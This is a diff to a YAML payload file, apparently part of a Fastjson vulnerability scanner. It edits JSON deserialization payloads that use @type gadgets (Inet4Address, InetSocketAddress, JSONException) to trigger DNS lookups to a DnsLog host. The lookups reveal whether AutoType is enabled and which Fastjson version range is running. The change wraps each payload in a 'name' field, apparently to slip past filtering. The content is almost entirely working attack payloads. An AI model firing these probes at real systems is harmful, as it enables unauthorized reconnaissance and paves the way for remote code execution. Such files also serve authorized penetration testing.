@@ -32,12 +32,12 @@ payloadModule:
   DetectAutoType:
     description: "AutoType检测(DnsLog收到请求即AutoType开启)"
     payloads:
-      - "[{\"@type\":\"java.net.CookiePolicy\"},{\"@type\":\"java.net.Inet4Address\",\"val\":\"${dnslog}\"}]"
+      - "{\"name\":[{\"@type\":\"java.net.CookiePolicy\"},{\"@type\":\"java.net.Inet4Address\",\"val\":\"${dnslog}\"}]}"
   DetectVersionByDnsLog:
     version48:
       description: "Fastjson < 1.2.48"
       payloads:
-        - "[{\"@type\":\"java.lang.Class\",\"val\":\"java.io.ByteArrayOutputStream\"}, {\"@type\":\"java.io.ByteArrayOutputStream\"}, {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"48.${dnslog}\"}}]"
+        - "{\"name\":[{\"@type\":\"java.lang.Class\",\"val\":\"java.io.ByteArrayOutputStream\"}, {\"@type\":\"java.io.ByteArrayOutputStream\"}, {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"48.${dnslog}\"}}]}"
     version68:
         description: "1.2.48 ≤ Fastjson ≤ 1.2.68"
         payloads:
@@ -45,7 +45,7 @@ payloadModule:
     version8083:
       description: "1.2.69 ≤ Fastjson ≤ 1.2.80"
       payloads:
-        - "[{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"80.${dnslog}\"}}},{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"message\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"83.${dnslog}\"}}}]"
+        - "{\"name\":[{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"80.${dnslog}\"}}},{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"message\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"83.${dnslog}\"}}}]}"
   DetectDependency:
     description: "依赖检测(根据报错内容判断)"
     DependencyList:
